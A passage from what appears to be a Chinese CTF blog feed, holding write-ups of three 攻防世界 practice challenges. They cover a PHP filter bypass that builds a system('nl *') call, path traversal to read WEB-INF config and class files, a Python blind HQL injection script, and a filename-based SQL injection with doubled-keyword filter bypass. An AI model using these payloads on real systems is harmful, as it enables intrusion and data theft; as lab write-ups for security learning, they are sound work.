代表把8768397090111664438从10进制转换为30进制，结果为getallheaders。注意这里不能用36进制，因为getallheaders的36进制转换为10进制后数太长会溢出，也就是无法把10进制数变回getallheader。所以我们在这里采用30进制。（当然这是在linux下使用php7.3版本的结果，如果是在windows下php7.0前的所有版本对于getallheader进行30-36的进制转换，再转换回来的时候都存在溢出，也就是无法把10进制数变回getallheader）</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141211795.png" alt="image-20220314121125721"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141214677.png" alt="image-20220314121409610"></p><p><strong>思路三</strong></p><p>使用system(nl*)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))</span><br></pre></td></tr></table></figure><p>base_convert(1751504350,10,36) ——–&gt;system</p><p>$pi(1438255411,14,34) ——&gt;hex2bin</p><p>dechex(1852579882) —–&gt;将十进制转为十六进制：6e6c202a（字符串形式是：nl *）</p><p>nl *可以读取当前目录下的所有文件；</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Zhuanxv</title>
      <link href="/java%E7%9F%A5%E8%AF%86/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/java-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CZhuanxv/"/>
      <url>/java%E7%9F%A5%E8%AF%86/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/java-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CZhuanxv/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Zhuanxv"><a href="#攻防世界Zhuanxv" class="headerlink" title="攻防世界Zhuanxv"></a>攻防世界Zhuanxv</h1><h2 id="文件包含下载文件"><a href="#文件包含下载文件" class="headerlink" title="文件包含下载文件"></a>文件包含下载文件</h2><p><img src="https://s2.loli.net/2022/03/08/bvPVYlpLIC8Utoe.png" alt="image-20220308150856182"></p><p>打开之后可以发现一个时钟页面,这里边点点看,边扫一下目录</p><p><img src="https://s2.loli.net/2022/03/08/lvSGAZ1Fn3pQxsi.png" alt="image-20220308151039296"></p><p>挨个打开看看,发现在list下面有一个登录</p><p><img src="https://s2.loli.net/2022/03/08/jdhlzSLFcaoNQqb.png" alt="image-20220308151206877"></p><p>这里随便点点,抓包看着点</p><p><img src="https://s2.loli.net/2022/03/08/rePz9LG6lhAMb3N.png" alt="image-20220308151344673"></p><p>发现有jsession ,但是这里为什么就能确定是java写的呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie</span><br><span class="line">“jsessionid是一个Cookie，可以通过在URL后面加上“;jsessionid=xxx”来传递“session id”；其中Servlet容器用来记录用户session，当我们创建回话时会自动创建，用来记录用户的访问记录。</span><br></pre></td></tr></table></figure><p>紧接着发现一个疑似文件包含的漏洞,一般考Java的题目都会想办法给出源码</p><p><img src="https://s2.loli.net/2022/03/08/NBLTvb4lKtO7GVj.png" alt="image-20220308151613489"></p><p>那么这里利用这个去尝试去读取..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/loadimage?fileName=../../WEB-INF/web.xml</span><br><span class="line"></span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line"></span><br><span class="line">WEB-INF主要包含一下文件或目录：</span><br><span class="line"></span><br><span class="line">- `/WEB-INF/web.xml`：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">- `/WEB-INF/classes/`：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">- `/WEB-INF/lib/`：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">- `/WEB-INF/src/`：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">- `/WEB-INF/database.properties`：数据库配置文件</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081541285.png" alt="image-20220308152100940"></p><p>有一个struts2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apps-存放了所有Struts2的示例项目</span><br><span class="line"></span><br><span class="line">docs-存放了所有Struts2与XWork的文档</span><br><span class="line"></span><br><span class="line">lib-存放了所有Struts2相关的JAR文件以及Struts2运行时所依赖的JAR文件</span><br><span class="line"></span><br><span class="line">src-存放了所有Struts2的源码，以Maven所指定的项目结构目录存放</span><br></pre></td></tr></table></figure><p>这里接着读取struts.xml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/loadimage?fileName=../../WEB-INF/classes/struts.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Disposition: attachment;filename=&quot;bg.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">Date: Tue, 08 Mar 2022 07:45:12 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 2243</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;strutsenableDynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;front&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exception-mapping</span> <span class="attr">exception</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">result</span>=<span class="string">&quot;error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;stream&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span>&gt;</span>image/jpeg<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentDisposition&quot;</span>&gt;</span>attachment;filename=&quot;bg.jpg&quot;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;inputName&quot;</span>&gt;</span>downloadFile<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;suffix_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;back&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;excludeMethods&quot;</span>&gt;</span></span><br><span class="line">                    execute</span><br><span class="line">                <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login_error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;list_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里有些class文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里试着下载class文件试试,将.替换为&#x2F;再在末尾添加.class</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com/cuitctf/action/UserLoginAction.class</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081553566.png" alt="image-20220308155313517"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081556294.png" alt="image-20220308155624245"></p><p>接着使用idea反编译,得到登录源码,这里截取了部分有用的源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">userCheck</span><span class="params">(User user)</span> &#123;</span><br><span class="line">    List&lt;User&gt; userList = <span class="built_in">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line">    <span class="keyword">if</span> (userList != <span class="literal">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着下载classes下面的applicationContext.xml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">applicationContext.xml</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081608412.png" alt="image-20220308160811364"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载userserviceimpl.class</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">loginCheck</span><span class="params">(String name, String password)</span> &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">username_matcher</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">password_matcher</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">    <span class="keyword">return</span> password_matcher.find() ? <span class="built_in">this</span>.userDao.loginCheck(name, password) : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到登录的规则</p><p>是登陆语句的过滤规则,在UserDaoImpl.class中找到:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">loginCheck</span><span class="params">(String name, String password)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getHibernateTemplate().find(<span class="string">&quot;from User where name =&#x27;&quot;</span> + name + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    p=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        payload = <span class="string">&quot;(select%0Aascii(substr(id,&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#x27;&quot;</span>+<span class="built_in">str</span>(j)+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        url=<span class="string">&quot;http://111.200.241.244:62308/zhuanxvlogin?user.name=admin&#x27;%0Aor%0A&quot;</span>+payload+<span class="string">&quot;%0Aor%0Aname%0Alike%0A&#x27;admin&amp;user.password=1&quot;</span></span><br><span class="line">        r1=s.get(url)</span><br><span class="line">        <span class="comment">#print url</span></span><br><span class="line">        <span class="comment">#print len(r1.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            flag+=p</span><br><span class="line">            <span class="built_in">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p=<span class="built_in">chr</span>(j)</span><br><span class="line">        <span class="comment">#sctf&#123;C46E250926A2DFFD831975396222B08E&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界upload</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/sql-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/sql-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界upload"><a href="#攻防世界upload" class="headerlink" title="攻防世界upload"></a>攻防世界upload</h1><p>扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142147854.png" alt="image-20220314214713805"></p><p>有几个配置文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142147604.png" alt="image-20220314214755557"></p><p>里面也发现不了什么东西,只能回到register页面</p><p>注册一个登进去,发现是一个上传目录的地方</p><p>小传一个,回显名称,文件链接呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142152589.png" alt="image-20220314215208538"></p><p>说是注入漏洞,我们之间select database()发现只剩下databse() select被替换为了空,那么我们先fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142203298.png" alt="image-20220314220327233"></p><p>这里直接双写绕过过滤</p><p>猜测它直接将我们上传的文件存入了数据库<br>那可能通过文件进行sql注入？<br>类似insert into 表名(‘filename’,…) values(‘上传的文件名’,…);这样</p><p>构造’ select database() ‘.jpg上传<br>结果被过滤了</p><p>猜测是select或空格被过滤<br>都改掉：双写select，空格用“+”<br>构造’+(selselectect database())+’.jpg<br>返回0<br><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142215072.png" alt="image-20220314221515010"></p><pre><code>CONV()：进制的转换</code></pre><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONV(N,from_base,to_base)</span><br><span class="line">select conv(16,10,16);</span><br><span class="line">+—————-+</span><br><span class="line">| conv(16,10,16) |</span><br><span class="line">+—————-+</span><br><span class="line">| 10 |</span><br><span class="line">+—————-+</span><br><span class="line">1 row in set (0.04 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N是要转换的数据，from_base是原进制，to_base是目标进制</span><br><span class="line">如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(-16,10,16);</span><br><span class="line">+——————+</span><br><span class="line">| conv(-16,10,16) |</span><br><span class="line">+——————+</span><br><span class="line">| FFFFFFFFFFFFFFF0 |</span><br><span class="line">+——————+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select conv(-16,10,-16);</span><br><span class="line">+——————+</span><br><span class="line">| conv(-16,10,-16) |</span><br><span class="line">+——————+</span><br><span class="line">| -10 |</span><br><span class="line">+——————+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr（）：搜索字符串</span><br><span class="line"></span><br><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串，start为起始位置，length为长度。</span><br><span class="line">mysql中的start是从1开始的，而hibernate中的start是从0开始的。</span><br></pre></td></tr></table></figure><p>所以构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt substr(database(),1,12))+&#x27;</span><br></pre></td></tr></table></figure><p>又返回一个0</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142219737.png" alt="image-20220314221936675"></p><p>这里将database进行16进制转码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt substr(hex(database()),1,12))+&#x27;</span><br></pre></td></tr></table></figure><p>返回了一个7765625</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142222869.png" alt="image-20220314222207808"></p><p>但是当进行16进制转字符串时却发现,并不是完整数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142223283.png" alt="image-20220314222322257"></p><p>说明有截断</p><p>那么就使用conv将16进制转换为10进制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex(database()),1,12),16,10))+&#x27;</span><br></pre></td></tr></table></figure><p>至于这里为什么要截取呢那是因为13太长了转换成十进制会造成科学计数法</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142229598.png" alt="image-20220314222928570"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex(database()),1,12),16,10))+&#x27;</span><br><span class="line">#web_up</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex(database()),13,12),16,10))+&#x27;</span><br><span class="line">#load</span><br><span class="line">database:web_upload</span><br></pre></td></tr></table></figure><p>接着注入表的时候发现from被过滤了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142235210.png" alt="image-20220314223529159"></p><p>再次双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),1,12),16,10))+&#x27;</span><br><span class="line">#files,</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),13,12),16,10))+&#x27;</span><br><span class="line">#hello_</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),25,12),16,10))+&#x27;</span><br><span class="line">#flag_i</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#x27;web_upload&#x27;)),37,12),16,10))+&#x27;</span><br><span class="line">#s_here</span><br><span class="line">#hello_flag_is_here</span><br></pre></td></tr></table></figure><p>得到字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(column_name) frfromom information_schema.columns where table_name=&#x27;hello_flag_is_here&#x27;)),1,12),16,10))+&#x27;</span><br><span class="line">#i_am_f</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt group_concat(column_name) frfromom information_schema.columns where table_name=&#x27;hello_flag_is_here&#x27;)),13,12),16,10))+&#x27;</span><br><span class="line">#lag</span><br><span class="line">#i_am_flag</span><br></pre></td></tr></table></figure><p>得到数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#x27;</span><br><span class="line">#!!_@m_</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#x27;</span><br><span class="line">#Th.e_F</span><br><span class="line">&#x27;+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#x27;</span><br><span class="line">#!lag</span><br><span class="line">#!!_@m_Th.e_F!lag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
